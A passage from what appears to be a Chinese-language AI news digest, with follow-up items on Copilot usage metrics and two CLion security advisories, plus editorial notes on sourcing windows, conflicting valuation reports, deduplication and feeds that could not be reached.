- **GitHub Copilot 企业用量口径**：本期已报道 Slack 与 Teams GA、进入 JetBrains Air 与 Xcode、code review 支持 API 管理三项更新 → 本期未单列、留待下期的一条为 Copilot impact dashboard 采用率图表覆盖 nine Copilot experiences、「Passive users」改名「Chat-first users」、用量 API 新增 `copilot_code_review` 对象与逐用户字段 `client_telemetry_present` / `usage_metrics_requirements` → 下一步关注企业侧采用率口径的正式公告与 API 字段文档。https://github.blog/changelog/2026-11-06-copilot-impact-dashboard-adds-chat-and-vs-code-agent-usage
- **JetBrains CLion 两条 critical 公告**（CVE-2026-123831 / CVE-2026-123832）：GitHub Advisory 于 11 月 6 日 18:35 UTC 收录，指向 2026.2 之前版本在 Safe Mode 下经 Meson project 与 JSON compilation daemon 路径可被触发代码执行 → 本期未完成受影响版本与修复版本的人工核对，故不写具体版本号、不入完整条目 → 下一步关注官方公告与 GHSA 页面的版本区间。

## 编辑备注

1. **检索窗口与发稿时间**：本例程原定 2026-11-07 07:00（Asia/Shanghai）触发，本次唤醒时间为 10:22 CST，起稿与检索在 10:30 前收口。本期采信条目首次公开时间落在 2026-11-05 20:00 至 2026-11-07 10:30 之间，重要遗漏补至 2026-11-04 10:30；其中第 18 条 ARTEX 的 Censys 一手报告发布于 2026-11-05（美东日期），属 72 小时补充窗口内的条目。
2. **来源冲突（已按原文分列，不合并）**：Anthropic 上市估值存在两组口径——金融时报为拟募 800 亿–1000 亿美元、估值 1.25 万亿–1.75 万亿美元；彭博为潜在买方预期低至 1.1 万亿美元、低于约一个月前的 2 万亿美元预期。两组数字均按原文保留。
3. **去重说明**：本期不重复第 011 期（2026-11-06）已报道的条目，包括 Gemini Omni 1.2 Flash、GPT-6 Cyber 发布本身、Claude Personal Finance、Meta Muse Voice、OpenAI 总裁关于 2027 年 IPO 的表态、llama.cpp b12129–b12138 构建、LiteLLM v1.108.0 正式版与 v1.109.0-rc.1、OpenSSH 10.6p2 修复本身、GPT-6 Astra「隐性表现不足」报告、Meta 怀俄明数据中心 170 亿美元投资、Dropbox 收购 Tigris Data 等。上述条目仅在有新增事实时进入「后续追踪」。
4. **官方宣称与独立验证的区分**：本条内容中的性能与规模数字（GPT-6 Cyber 的越界率与基准分、Anthropic 的模型能力描述、Underdog Woof 的词错率与速度、llama.cpp 的结构参数）均为发布方口径，正文已标注「官方称」，未表述为已独立验证。
5. **采集限制**：The New Stack 关于 Meta 专门模型的页面触发 JavaScript 质询，无法读取正文，已列入线索雷达并标注需人工打开；美国司法部关于 AI 冒充律所高管起诉的新闻稿页面在本环境中无法连通（连接失败），因此该条保留在线索雷达，正文只给标题、链接与日期。
6. **本文与视频的关系**：本期视频的事实来源为本文正文母版单一 source，不引入母版以外的事实；视频内不包含评论、推测与建议性表述。视频口播条目覆盖母版前 13 条（第 14、15、17、18 条为本轮合稿追加，事实已核实但不在本次视频生成的口播清单内）。
7. **补充采集范围**：在主窗口（2026-11-05 20:00 ~ 2026-11-07 10:30 CST）之外另做一次一级源补漏复核，补入 OpenAI 官方新闻与官方状态页、GitHub Changelog 与 GitHub Security Advisories、TechCrunch 全量 feed 共 7 组线索，逐条判定后入稿 5 条（另 1 条条件式不启用），详见 CMP-395。
8. **已查无更新（避免下期重复检索）**：Anthropic 官方状态页 11-06 → 11-07 无新事件（最近一条为 10-28 Google Calendar connector）；Microsoft 官方博客 `blogs.microsoft.com/feed/` 无新帖（最新仍为 10-28）；Google DeepMind RSS 窗口内仅 Gemini Omni 1.2 Flash，与本期第 011 期已报道条目重复不重复发；Ollama 博客无新帖（最新 10-24）；Anthropic 官方 RSS（/rss.xml）404。
9. **采集限制**：Mistral 官方 news feed 三个路径（/news/feed.xml、/news/rss.xml、/feed.xml）均返回站点 HTML 首页（404），**本期 Mistral 侧未取得一级源，需人工补核**；`blogs.microsoft.com/ai/feed/` 返回 HTTP 410 错误页（改用 `blogs.microsoft.com/feed/`）；`techcrunch.com/category/developer/feed/` 返回 Turnstile 校验页（改用 `techcrunch.com/feed/`）。OpenAI 两条官方新闻正文页在本环境返回 403，仅核实官方 RSS 的标题、分类、发布时间与摘要，母版未据此扩写细节，已在对应条目标注需人工打开。
10. **未入稿但已核查**：LXD 于 11-06 发布 9 条公告（critical 6、high 2、medium 1），因与 AI 生态关联弱且与本期安全条目重叠而未单列；GitHub Blog《Beyond code generation》观点文与 TechCrunch《The Duo apps are coming》与开发者读者关联弱，未入稿。
